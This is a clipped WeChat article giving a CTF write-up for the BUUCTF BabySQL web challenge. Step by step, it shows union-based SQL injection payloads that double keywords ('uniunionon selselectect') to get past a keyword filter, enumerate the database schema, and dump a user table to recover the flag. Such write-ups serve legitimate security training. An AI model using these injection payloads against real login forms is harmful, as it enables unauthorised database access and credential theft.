---
title: 【微信】buuctf-cf2 WEB [极客大挑战 2019]BabySQL writeup
source: https://mp.weixin.qq.com/s/tC_Iw0ZGym_WjABYXt6nHQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-08T08:52:58+08:00
trace_id: 7ff24ed8-2d22-40fc-a0f7-c802ebb96425
content_hash: 942969d80c149dc3611c51c41d89370074aae6c906e03d73721db4e8b0d41946
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 21
  succeeded: 21
  failed_urls: []
notion_page_id: 41275244-d011-8164-8ca9-f12ba3e28c10
ioc:
  cves: []
  cwes: []
  hashes:
    - ce9e583ae35e11bf386a4da146abfb87
  domains: []
  tools: []
  techniques: []
---

**长弓三皮** *2026年11月8日 08:08*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/aa26d0c78a4cfbeb.gif)

***随波逐流工作室—-探索前沿科技，分享最新软件。点击标题下蓝字“*** ***长弓三皮*** ***”关注，我们将为您提供有深度、有价值、有意思的阅读。***

*朋友们，现在只对常读和星标的公众号才展示大图推送，建议大家把长弓三皮“设为星标”，否则可能就看不到了啦！*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cd2b2624092dfe17.png)

作者：随波逐流

**buuctf-ctf2 WEB**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4d1e60798744c118.png)

**随波逐流**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3336db7408a58ec1.gif)

**WriteUp**

打开 \[随波逐流\]WEB安全工具访问

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c2b221ee2ef482fa.png)

随便输入admin:123

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/103e2d82b530cb37.png)

源代码也看不出什么

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3312cc553809a222.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1343376fb48be0a6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/dbc3e4d1e29e1f5b.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5760387f7e6b7393.png)

扫描试试

密码：ce9e583ae35e11bf386a4da146abfb87

```ruby
?username=admin&password=ce9e583ae35e11bf386a4da146abfb87' oorrder bbyy '3' %23
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/2cc8313142852857.png)

登录回显成功，说明有3列

```ruby
?username=admin&password=' uniunionon selselectect 1,2,3%23
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/db074b6197939f2a.png)

2、3列回显位

爆数据库

```ruby
?username=admin&password=' uniunionon selselectect 1,2,database()%23
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e629a512fef232f8.png)

爆表名

```ruby
?username=admin&password=' uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/21d5876caf0d1c4d.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/54cea7dce6f57b2d.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/704ef8df12a2dae0.png)

爆列名

```ruby
?username=admin&password=' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'%23
```

爆字段数据

```ruby
?username=admin&password=' uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23
```

CTF2{630f8c35-65af-4be3-b25d-856cb5b29e16}

**公众号内输入**

**搜索公众号+题目标题**

**可搜索到此文章**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e90d1a23ad03dd9b.png)

\-------------------------------------------

软件发布网址： 随波逐流信息安全网

http://www.1o1o.xyz

微信公众号：长弓三皮

\--------------------------------------------

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1df56ee7b19cf033.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9772a8cf443a3be8.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/73b2528fa5d291cc.png)

你若喜欢，为“长弓三皮”点个赞和在看哦

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/57c061084d069b0b.gif)

文章 · 目录
